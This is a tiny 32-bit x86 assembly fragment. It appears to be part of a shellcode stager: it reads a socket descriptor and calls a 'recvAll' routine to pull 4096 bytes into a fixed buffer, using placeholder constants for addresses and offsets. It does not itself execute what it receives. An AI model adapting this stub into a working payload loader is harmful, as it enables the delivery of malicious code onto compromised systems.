BITS 32

popa
pop ebx

;fd
movzx ecx, word [ebx+0x11223344]

push dword 4096

;address to receive to
push 0x11223344
push ecx

;address of recvAll
add ebx, 0x55667788
call ebx

